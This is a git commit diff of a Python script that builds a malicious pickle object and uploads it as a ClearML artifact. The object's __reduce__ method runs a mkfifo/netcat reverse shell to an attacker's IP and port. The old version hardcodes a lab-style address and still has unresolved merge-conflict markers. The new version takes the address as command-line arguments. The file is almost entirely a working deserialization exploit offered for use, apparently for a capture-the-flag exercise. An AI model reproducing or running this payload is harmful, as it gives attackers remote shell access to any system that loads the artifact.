866a3932dd9c428341f5b1064d91b5c4f00dd54d
draven920 <34629513+draven920@users.noreply.github.com>
2024-06-16 01:07:22 +0800

    Update pklartifact.py

--- pklartifact.py
+++ pklartifact.py
@@ -1,53 +1,37 @@
-import os
-import subprocess
+import argparse
 from clearml import Task
+import pickle, os
 
-# Define a class that exploits deserialization vulnerability
-class ShellExecutor:
-    # The __reduce__ method is used for object serialization
+class RunCommand:
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+
     def __reduce__(self):
-        # Define a command to create a reverse shell
-<<<<<<< HEAD
-<<<<<<< HEAD
-        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -nv 10.10.14.13 4949 >/tmp/f"
-=======
-        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 5245 >/tmp/f"
->>>>>>> 6804776 (Initial commit)
-=======
-        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -nv 10.10.14.13 4949 >/tmp/f"
->>>>>>> 64624d9 (Update pklartifact.py with new reverse shell command and task details)
-        # Return the subprocess.call function and the command as arguments
-        return (subprocess.call, (cmd,))
+        command = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {self.ip} {self.port} >/tmp/f'
+        return (os.system, (command,))
 
-# Instantiate the class, setting up for the exploit
-shell_executor = ShellExecutor()
+def main():
+    parser = argparse.ArgumentParser(description='Upload a pickle artifact to ClearML with dynamic parameters.')
+    parser.add_argument('--project_name', required=True, help='The name of the ClearML project')
+    parser.add_argument('--task_name', required=True, help='The name of the ClearML task')
+    parser.add_argument('--tags', nargs='+', required=True, help='Tags for the ClearML task')
+    parser.add_argument('--artifact_name', required=True, help='The name of the artifact to upload')
+    parser.add_argument('--ip', required=True, help='The IP address for the reverse shell')
+    parser.add_argument('--port', required=True, help='The port number for the reverse shell')
 
-# Initialize a ClearML task
-task = Task.init(
-<<<<<<< HEAD
-<<<<<<< HEAD
-    project_name="Black Swan",    # Name of the ClearML project
-    task_name="dravenTask3",  # Name of the specific task
-=======
-    project_name="draven",    # Name of the ClearML project
-    task_name="dravenTask2",  # Name of the specific task
->>>>>>> 6804776 (Initial commit)
-=======
-    project_name="Black Swan",    # Name of the ClearML project
-    task_name="dravenTask3",  # Name of the specific task
->>>>>>> 64624d9 (Update pklartifact.py with new reverse shell command and task details)
-    tags=["review"],              # Tags associated with the task for categorization
-    task_type=Task.TaskTypes.data_processing,  # Type of the task, in this case, data processing
-    output_uri=True               # Output URI is set to True
-)
+    args = parser.parse_args()
 
-# Upload an artifact associated with the task
-task.upload_artifact(
-    name="dravenArtifact",   # Name of the artifact
-    artifact_object=shell_executor, # Artifact object, in this case, the instance of ShellExecutor
-    retries=2,                    # Number of retries for the upload
-    wait_on_upload=True           # Whether to wait for the upload to complete
-)
+    print(f"[+] Initializing command with IP: {args.ip} and Port: {args.port}")
+    command = RunCommand(ip=args.ip, port=args.port)
 
-# Execute the task remotely on a specified queue
-task.execute_remotely(queue_name='default')
+    print(f"[+] Initializing ClearML task with project name: {args.project_name}, task name: {args.task_name}, tags: {args.tags}")
+    task = Task.init(project_name=args.project_name, task_name=args.task_name, tags=args.tags)
+    
+    print(f"[+] Uploading artifact with name: {args.artifact_name}")
+    task.upload_artifact(name=args.artifact_name, artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
+
+    print("[+] Artifact uploaded successfully")
+
+if __name__ == "__main__":
+    main()
